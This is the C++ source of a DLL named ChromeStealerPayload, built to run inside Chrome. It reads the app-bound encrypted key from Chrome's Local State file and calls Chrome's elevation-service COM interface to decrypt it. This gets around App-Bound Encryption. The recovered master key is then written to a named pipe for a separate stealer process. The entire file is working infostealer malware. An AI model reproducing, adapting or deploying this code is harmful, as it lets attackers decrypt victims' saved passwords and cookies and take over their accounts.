// ChromeStealerPayload.dll - runs inside Chrome process, calls IElevator::DecryptData
// to obtain the app-bound key and sends it via named pipe (ABE bypass per xaitax research).

#include <Windows.h>
#include <Shlobj.h>
#include <comdef.h>
#include <string>
#include <fstream>
#include <vector>

// Chrome IElevator COM - CLSID and IID from Chromium elevation_service
// https://chromium.googlesource.com/chromium/src/+/master/chrome/elevation_service/
static const CLSID CLSID_ChromeElevator = {
    0x708860E0, 0xF641, 0x4611, { 0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B }
};
static const IID IID_IElevator = {
    0x463ABECF, 0x410D, 0x407F, { 0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8 }
};

// IElevator::DecryptData(ciphertext_bstr, &plaintext_bstr, &last_error)
MIDL_INTERFACE("463ABECF-410D-407F-8AF5-0DF35A005CC8")
IElevator : public IUnknown {
public:
    virtual HRESULT STDMETHODCALLTYPE RunRecoveryCRXElevated(
        const WCHAR* crx_path, const WCHAR* browser_appid,
        const WCHAR* origin_url, DWORD* last_error) = 0;
    virtual HRESULT STDMETHODCALLTYPE EncryptData(
        DWORD protection_level, const BSTR plaintext,
        BSTR* ciphertext, DWORD* last_error) = 0;
    virtual HRESULT STDMETHODCALLTYPE DecryptData(
        const BSTR ciphertext, BSTR* plaintext, DWORD* last_error) = 0;
};

#pragma comment(lib, "Crypt32.lib")

static std::string Base64Decode(const std::string& in) {
    DWORD len = 0;
    if (!CryptStringToBinaryA(in.c_str(), (DWORD)in.size(), CRYPT_STRING_BASE64, NULL, &len, NULL, NULL))
        return "";
    std::vector<BYTE> buf(len);
    if (!CryptStringToBinaryA(in.c_str(), (DWORD)in.size(), CRYPT_STRING_BASE64, buf.data(), &len, NULL, NULL))
        return "";
    return std::string((char*)buf.data(), len);
}

// Minimal JSON value extraction: find "app_bound_encrypted_key" and return string value
static std::string ExtractAppBoundKeyFromLocalState(const std::wstring& path) {
    std::ifstream f(path);
    if (!f) return "";
    std::string content((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
    f.close();
    const char* key = "\"app_bound_encrypted_key\"";
    size_t pos = content.find(key);
    if (pos == std::string::npos) return "";
    pos = content.find(':', pos);
    if (pos == std::string::npos) return "";
    pos = content.find('"', pos);
    if (pos == std::string::npos) return "";
    pos++;
    size_t end = content.find('"', pos);
    if (end == std::string::npos) return "";
    return content.substr(pos, end - pos);
}

static std::wstring ReadPipeNameFromConfig() {
    WCHAR path[MAX_PATH];
    if (GetTempPathW(MAX_PATH, path) == 0)
        return L"";
    wcscat_s(path, L"cs_abe_pipe.txt");
    std::ifstream f(path);
    if (!f) return L"";
    std::string line;
    if (!std::getline(f, line) || line.empty()) return L"";
    std::wstring result(line.begin(), line.end());
    return result;
}

static void WorkerThread(HMODULE hMod) {
    std::wstring pipeName = ReadPipeNameFromConfig();
    if (pipeName.empty())
        pipeName = L"\\\\.\\pipe\\ChromeStealerKey";

    WCHAR configPath[MAX_PATH];
    if (FAILED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, configPath))) {
        FreeLibraryAndExitThread(hMod, 1);
        return;
    }
    wcscat_s(configPath, L"\\Google\\Chrome\\User Data\\Local State");

    std::wstring localStatePath(configPath);
    std::string keyB64 = ExtractAppBoundKeyFromLocalState(localStatePath);
    if (keyB64.empty()) {
        FreeLibraryAndExitThread(hMod, 2);
        return;
    }

    std::string raw = Base64Decode(keyB64);
    if (raw.size() < 4 || raw.substr(0, 4) != "APPB") {
        FreeLibraryAndExitThread(hMod, 3);
        return;
    }
    raw = raw.substr(4);

    BSTR ciphertextBstr = SysAllocStringByteLen(raw.c_str(), (UINT)raw.size());
    if (!ciphertextBstr) {
        FreeLibraryAndExitThread(hMod, 4);
        return;
    }

    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) {
        SysFreeString(ciphertextBstr);
        FreeLibraryAndExitThread(hMod, 5);
        return;
    }

    IElevator* pElevator = NULL;
    hr = CoCreateInstance(CLSID_ChromeElevator, NULL, CLSCTX_LOCAL_SERVER, IID_IElevator, (void**)&pElevator);
    if (FAILED(hr) || !pElevator) {
        SysFreeString(ciphertextBstr);
        CoUninitialize();
        FreeLibraryAndExitThread(hMod, 6);
        return;
    }

    BSTR plaintextBstr = NULL;
    DWORD lastError = 0;
    hr = pElevator->DecryptData(ciphertextBstr, &plaintextBstr, &lastError);
    SysFreeString(ciphertextBstr);
    pElevator->Release();

    if (FAILED(hr) || !plaintextBstr) {
        CoUninitialize();
        FreeLibraryAndExitThread(hMod, 7);
        return;
    }

    UINT keyLen = SysStringByteLen(plaintextBstr);
    const char* keyBytes = (const char*)plaintextBstr;
    if (keyLen > 32) keyLen = 32;

    HANDLE hPipe = CreateFileW(pipeName.c_str(), GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hPipe != INVALID_HANDLE_VALUE) {
        DWORD written;
        WriteFile(hPipe, keyBytes, keyLen, &written, NULL);
        CloseHandle(hPipe);
    }

    SysFreeString(plaintextBstr);
    CoUninitialize();
    FreeLibraryAndExitThread(hMod, 0);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkerThread, hModule, 0, NULL);
        if (hThread) CloseHandle(hThread);
    }
    return TRUE;
}
